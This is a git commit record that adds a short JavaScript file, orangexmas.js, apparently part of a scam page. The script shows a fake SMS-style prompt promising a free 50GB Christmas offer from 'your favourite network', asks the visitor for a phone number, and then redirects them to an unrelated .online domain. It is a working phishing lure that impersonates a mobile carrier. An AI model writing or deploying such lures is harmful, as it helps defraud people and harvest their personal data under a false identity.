f9dd1052f8b96689184c4efa7932669241ac5599
newetijazz11 <newetijazz11@gmail.com>
2025-12-30 07:22:13 +0100

    Create orangexmas.js

---
+++ orangexmas.js
@@ -0,0 +1,8 @@
+var password = 'GET 50GB'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive Christmas offer from your favourite network. Please press OK to Enter your Phone Number.',
+  'GET 50GB'
+);
+if (password != 'GET 50GB') {
+  location.href = 'https://www.bhufrizx.online/orange50gb';
+}
